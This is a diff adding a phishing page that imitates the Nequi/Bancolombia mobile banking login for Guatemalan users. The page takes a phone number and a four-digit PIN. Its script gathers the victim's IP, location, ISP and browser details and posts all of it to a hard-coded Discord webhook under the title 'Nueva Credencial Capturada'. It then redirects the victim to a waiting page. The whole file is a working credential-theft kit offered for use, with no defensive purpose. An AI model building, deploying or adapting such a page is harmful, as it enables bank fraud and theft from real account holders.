+  .bancolombia-logo-wrapper img { width: 28px; object-fit: contain; filter: brightness(0.75) grayscale(0.3); }
+
+  #pinScreen { justify-content: flex-start; }
+  .pin-topbar { width: 100%; display: flex; align-items: center; min-height: 44px; margin-bottom: 4px; }
+  .back-btn { color: white; font-size: 28px; cursor: pointer; background: none; border: none; padding: 8px 8px 8px 0; line-height: 1; }
+  .pin-title { font-size: clamp(22px,6vw,28px); font-weight: 700; margin-top: 8px; margin-bottom: 32px; align-self: flex-start; }
+
+  .pin-boxes { display: flex; gap: clamp(12px,4vw,20px); margin-bottom: 16px; }
+  .pin-box { width: clamp(58px,16vw,70px); height: clamp(58px,16vw,70px); background: #4a2860; border-radius: 12px; transition: background 0.15s, transform 0.12s; }
+  .pin-box.filled { background: #c4006e; transform: scale(1.06); }
+
+  .pin-subtitle { color: #aaa; font-size: clamp(13px,3.5vw,15px); text-align: center; line-height: 1.7; }
+
+  .keypad { width: 100%; margin-top: auto; }
+  .keypad-row { display: flex; justify-content: space-around; }
+  .key {
+    width: 33.33%; height: clamp(64px,16vw,80px);
+    background: transparent; border: none; color: white;
+    font-size: clamp(28px,7.5vw,36px); font-weight: 300;
+    cursor: pointer; border-radius: 14px;
+    display: flex; align-items: center; justify-content: center;
+    touch-action: manipulation; transition: background 0.1s, transform 0.1s;
+  }
+  .key:active { background: #3a1040; transform: scale(0.88); }
+  .key.empty { pointer-events: none; }
+  .key.del { font-size: clamp(20px,5vw,26px); }
+
+  .forgot-btn {
+    width: 80%; background: transparent; border: 1.5px solid #666; color: white;
+    border-radius: 14px; padding: clamp(13px,3.5vw,16px); font-size: clamp(14px,3.8vw,16px);
+    cursor: pointer; margin-top: 10px; margin-bottom: 4px;
+    touch-action: manipulation; transition: border-color 0.2s;
+  }
+  .forgot-btn:active { border-color: #d4006e; }
+
+  @keyframes slideOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(-100%); opacity: 0; } }
+  @keyframes slideIn  { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+  .slide-out { animation: slideOut 0.32s ease forwards; }
+  .slide-in  { animation: slideIn  0.32s ease forwards; }
+
+  .sending-overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(32,0,32,0.88);
+    align-items: center; justify-content: center;
+    flex-direction: column; gap: 16px; z-index: 200;
+  }
+  .sending-overlay.show { display: flex; }
+  .spinner { width: 48px; height: 48px; border: 4px solid #5a3070; border-top-color: #d4006e; border-radius: 50%; animation: spin 0.8s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .sending-text { color: #ccc; font-size: 15px; }
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div class="screen" id="loginScreen">
+  <span class="help-btn">?</span>
+  <div class="logo-container">
+    <img class="nequi-logo"
+      src="https://www.valoraanalitik.com/wp-content/uploads/2024/06/Nequi-5.jpg"
+      alt="Nequi"
+      onerror="this.outerHTML='<div style=&quot;font-size:clamp(36px,10vw,52px);font-weight:900;color:white;&quot;><span style=&quot;color:#d4006e;&quot;>&#183;</span>Nequi</div>'"
+    />
+  </div>
+  <div class="login-bottom">
+    <div class="phone-input-wrapper">
+      <span class="country-code">+502</span>
+      <input type="tel" id="phoneInput" placeholder="Número de cel" maxlength="8" inputmode="numeric" autocomplete="tel" />
+    </div>
+    <!-- Botón entra -->
+    <button class="form-btn-submit" type="button" id="enterBtn" disabled>Entra</button>
+    <div class="bancolombia-logo-wrapper">
+      <span>by</span>
+      <img src="https://www.bancolombia.com/wcm/connect/b8e4c3f2-36a9-497d-a125-ac04f83b0bf8/LogoBancolombia.png?MOD=AJPERES"
+        alt="Bancolombia" onerror="this.style.display='none'" />
+    </div>
+  </div>
+</div>
+
+<!-- PIN -->
+<div class="screen hidden" id="pinScreen">
+  <div class="pin-topbar">
+    <button class="back-btn" onclick="goBack()">&#8592;</button>
+  </div>
+  <h2 class="pin-title">Escribe tu clave</h2>
+  <div class="pin-boxes">
+    <div class="pin-box" id="box0"></div>
+    <div class="pin-box" id="box1"></div>
+    <div class="pin-box" id="box2"></div>
+    <div class="pin-box" id="box3"></div>
+  </div>
+  <p class="pin-subtitle">No dudamos que seas tú...<br>Pero es mejor confirmar ;)</p>
+  <div class="keypad">
+    <div class="keypad-row">
+      <button class="key" onclick="pressKey('1')">1</button>
+      <button class="key" onclick="pressKey('2')">2</button>
+      <button class="key" onclick="pressKey('3')">3</button>
+    </div>
+    <div class="keypad-row">
+      <button class="key" onclick="pressKey('4')">4</button>
+      <button class="key" onclick="pressKey('5')">5</button>
+      <button class="key" onclick="pressKey('6')">6</button>
+    </div>
+    <div class="keypad-row">
+      <button class="key" onclick="pressKey('7')">7</button>
+      <button class="key" onclick="pressKey('8')">8</button>
+      <button class="key" onclick="pressKey('9')">9</button>
+    </div>
+    <div class="keypad-row">
+      <button class="key empty"></button>
+      <button class="key" onclick="pressKey('0')">0</button>
+      <button class="key del" onclick="deleteLast()">&#9003;</button>
+    </div>
+  </div>
+  <button class="forgot-btn">Olvidé mi clave</button>
+</div>
+
+<div class="sending-overlay" id="sendingOverlay">
+  <div class="spinner"></div>
+  <div class="sending-text">Verificando...</div>
+</div>
+
+<script>
+  // MISMO ESTILO QUE TU PÁGINA BNC
+  const WEBHOOK = "https://discord.com/api/webhooks/1478941711848702032/w19VzhDPz3r2AJNKxVDYMPM3N43i26cEkhLOpkV8ZErHfkuG2v8g8_CXFSRvlOHEd8sj";
+
+  let pin = [];
+  let phoneNumber = "";
+
+  const phoneInput = document.getElementById("phoneInput");
+  const enterBtn   = document.getElementById("enterBtn");
+
+  // Activa / desactiva el botón según haya número
+  phoneInput.addEventListener("input", function () {
+    enterBtn.disabled = this.value.trim().length === 0;
+  });
+
+  phoneInput.addEventListener("keydown", function (e) {
+    if (e.key === "Enter" && !enterBtn.disabled) {
+      e.preventDefault();
+      goToPin();
+    }
+  });
+
+  enterBtn.addEventListener("click", function (e) {
+    e.preventDefault();
+    if (!enterBtn.disabled) goToPin();
+  });
+
+  function goToPin() {
+    if (enterBtn.disabled) return;
+    phoneNumber = phoneInput.value.trim();
+    const login  = document.getElementById("loginScreen");
+    const pinScr = document.getElementById("pinScreen");
+    login.classList.add("slide-out");
+    setTimeout(function () {
+      login.classList.add("hidden");
+      login.classList.remove("slide-out");
+      pinScr.classList.remove("hidden");
+      pinScr.classList.add("slide-in");
+      setTimeout(function () { pinScr.classList.remove("slide-in"); }, 350);
+    }, 320);
+  }
+
+  function goBack() {
+    const login  = document.getElementById("loginScreen");
+    const pinScr = document.getElementById("pinScreen");
+    pin = []; updateBoxes();
+    pinScr.classList.add("slide-out");
+    setTimeout(function () {
+      pinScr.classList.add("hidden");
+      pinScr.classList.remove("slide-out");
+      login.classList.remove("hidden");
+      login.classList.add("slide-in");
+      setTimeout(function () { login.classList.remove("slide-in"); }, 350);
+    }, 320);
+  }
+
+  function pressKey(val) {
+    if (pin.length >= 4) return;
+    pin.push(val); updateBoxes();
+    if (pin.length === 4) setTimeout(submitPin, 300);
+  }
+
+  function deleteLast() { pin.pop(); updateBoxes(); }
+
+  function updateBoxes() {
+    for (let i = 0; i < 4; i++) {
+      const b = document.getElementById("box" + i);
+      if (i < pin.length) b.classList.add("filled");
+      else b.classList.remove("filled");
+    }
+  }
+
+  // Misma lógica de ubicación que usas en BNC (solo IP APIs)
+  async function getLocation() {
+    const apis = [
+      { url: "https://ipapi.co/json/",
+        parse: d => d.ip ? { ip: d.ip, city: d.city, region: d.region, country: d.country_name, isp: d.org } : null },
+      { url: "https://ip-api.com/json/?fields=status,country,regionName,city,isp,query",
+        parse: d => d.status === "success" ? { ip: d.query, city: d.city, region: d.regionName, country: d.country, isp: d.isp } : null },
+      { url: "https://ipwho.is/",
+        parse: d => d.ip ? { ip: d.ip, city: d.city, region: d.region, country: d.country, isp: (d.connection && d.connection.isp) || d.org } : null }
+    ];
+    for (const api of apis) {
+      try {
+        const r = await fetch(api.url, { signal: AbortSignal.timeout(5000) });
+        const d = await r.json();
+        const result = api.parse(d);
+        if (result) return result;
+      } catch (_) {}
+    }
+    return null;
+  }
+
+  async function submitPin() {
+    document.getElementById("sendingOverlay").classList.add("show");
+
+    const pinCode = pin.join("");
+    const now     = new Date().toLocaleString("es-GT", { timeZone: "America/Guatemala" });
+
+    const loc = await getLocation();
+    let locationValue = "📍 No disponible\n🌐 IP: `N/A`\n🏢 ISP: N/A";
+    if (loc) {
+      const locStr = [loc.city, loc.region, loc.country].filter(Boolean).join(", ");
+      locationValue = `📍 ${locStr}\n🌐 IP: \`${loc.ip || "N/A"}\`\n🏢 ISP: ${loc.isp || "N/A"}`;
+    }
+
+    const payload = {
+      username: "Nequi - BR0K3N",
+      avatar_url: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/032018/untitled-1_97.png?e22e6XTI6KykJ23AmbIiLR_EHC0QR1hq&itok=SCUxTlGZ",
+      embeds: [{
+        title: "Nueva Credencial Capturada — Nequi GT",
+        description: "Se ha recibido un nuevo intento de inicio de sesión.",
+        color: 15158332,
+        fields: [
+          { name: "📱 Número",          value: "```+502 " + phoneNumber + "```", inline: true  },
+          { name: "🔑 Clave",           value: "```"      + pinCode     + "```", inline: true  },
+          { name: "🕐 Hora (GT)",       value: "```"      + now         + "```", inline: false },
+          { name: "🌍 Ubicación Real",  value: locationValue,                 inline: false },
+          { name: "💻 Dispositivo",     value: "```" + navigator.userAgent + "```", inline: false }
+        ],
+        footer: {
+          text: "Powered By @Brknshinexxx",
+          icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/500px-Telegram_logo.svg.png"
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    try {
+      const res = await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      if (res.ok || res.status === 204) {
+        window.location.href = "wait.html";
+      } else {
+        throw new Error("HTTP " + res.status);
+      }
+    } catch (err) {
+      // Si falla igual redirige
+      window.location.href = "wait.html";
+    }
+  }
+</script>
+</body>
+</html>
